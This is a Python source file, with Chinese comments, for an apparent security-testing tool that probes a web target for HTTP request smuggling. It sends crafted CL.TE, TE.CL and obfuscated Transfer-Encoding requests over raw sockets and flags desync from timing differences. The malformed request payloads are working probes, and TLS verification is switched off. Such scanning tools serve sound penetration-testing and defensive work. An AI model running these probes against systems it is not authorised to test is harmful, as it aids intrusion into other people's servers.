# -*- coding: utf-8 -*-
"""hunt-request-smuggling hunt 阶段：raw-socket 时序差分探测 desync。

原理：CL.TE 探测构造"后端会挂起等更多字节"的请求，若后端信 TE、按 chunked 在 0 处
结束，则前端按 CL 还在等 → 连接挂起接近超时；正常请求快返回。用**中位延迟差**判 desync，
不靠猜。TE.CL 反之让前端挂起。

必须用 raw socket：curl/requests 会规范化头，发不出畸形 TE/CL。

用法:
  python hunt_smuggling.py --target https://host[/path] --output candidates.json [--timeout 8] [--repeat 3]

安全：默认只发**自请求**时序探测（不毒化真实用户）。毒化验证在 validate 阶段且需 scope allow_poison。
"""
import argparse
import json
import os
import socket
import ssl
import statistics
import sys
import time
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, save_json  # noqa: E402


def variants(host, path):
    """返回 [(name, raw_bytes, expect)]。expect=slow 表示命中该 desync 时后端会挂起。"""
    base = ("POST %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n" % (path, host))
    V = []
    # 基线：正常小请求，应快
    V.append(("baseline", (base + "Content-Length: 0\r\n\r\n").encode(), "fast"))
    # CL.TE：前端 CL 读全部，后端 TE 在 0 处停 —— 若后端信 TE，前端等剩余字节→慢
    clte = base + "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
    V.append(("CL.TE", clte.encode(), "slow"))
    # 冒号前空格 TE（骗前端检测）
    sp = base + "Content-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nX"
    V.append(("TE-space-colon", sp.encode(), "slow"))
    # Tab 分隔 TE
    tab = base + "Content-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nX"
    V.append(("TE-tab", tab.encode(), "slow"))
    # TE.CL：前端 TE 读完，后端 CL 少读 —— 若前端信 TE 挂起等 0 块
    tecl = base + "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    V.append(("TE.CL", tecl.encode(), "maybe"))
    return V


def send_raw(host, port, use_tls, raw, timeout):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(raw)
        s.settimeout(timeout)
        data = b""
        try:
            while len(data) < 4096:
                chunk = s.recv(2048)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    break
        except socket.timeout:
            return timeout, "TIMEOUT", data[:200]
        finally:
            s.close()
        dur = time.time() - t0
        status = data.split(b"\r\n", 1)[0].decode("latin1", "replace") if data else ""
        return dur, status, data[:200]
    except Exception as e:
        return time.time() - t0, "ERR:%s" % e, b""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--repeat", type=int, default=3)
    args = ap.parse_args()

    u = urlparse(args.target if "://" in args.target else "http://" + args.target)
    host = u.hostname
    use_tls = u.scheme == "https"
    port = u.port or (443 if use_tls else 80)
    path = u.path or "/"

    log("目标 %s:%d tls=%s path=%s" % (host, port, use_tls, path))
    results = []
    base_med = None
    for name, raw, expect in variants(host, path):
        times = []
        last_status = last_body = None
        for _ in range(args.repeat):
            dur, status, body = send_raw(host, port, use_tls, raw, args.timeout)
            times.append(dur)
            last_status, last_body = status, body
            time.sleep(0.3)
        med = statistics.median(times)
        if name == "baseline":
            base_med = med
        results.append({"variant": name, "expect": expect, "median_time": round(med, 3),
                        "times": [round(t, 3) for t in times], "status": last_status,
                        "body_head": last_body.decode("latin1", "replace")[:120]})

    # 判定：非 baseline 变体中位延迟显著高于基线（>基线+2s 或接近 timeout）→ 疑似 desync
    cands = []
    for r in results:
        if r["variant"] == "baseline":
            continue
        slow = base_med is not None and (r["median_time"] > base_med + 2.0
                                         or r["status"] == "TIMEOUT")
        signal = []
        if slow:
            signal.append("时序挂起(基线%.2fs→%.2fs)" % (base_med or 0, r["median_time"]))
        if r["status"] == "TIMEOUT":
            signal.append("后端超时挂起(强 desync 信号)")
        cands.append({**r, "target": args.target, "host": host,
                      "suspected_desync": slow, "signal": signal or ["无明显时序差"]})

    save_json(args.output, {"target": args.target, "baseline_median": base_med,
                            "candidates": cands})
    hit = sum(1 for c in cands if c["suspected_desync"])
    log("探测完成：%d/%d 变体疑似 desync -> %s（validate 复核，深度确认用 Burp/smuggler.py）"
        % (hit, len(cands), args.output))


if __name__ == "__main__":
    main()
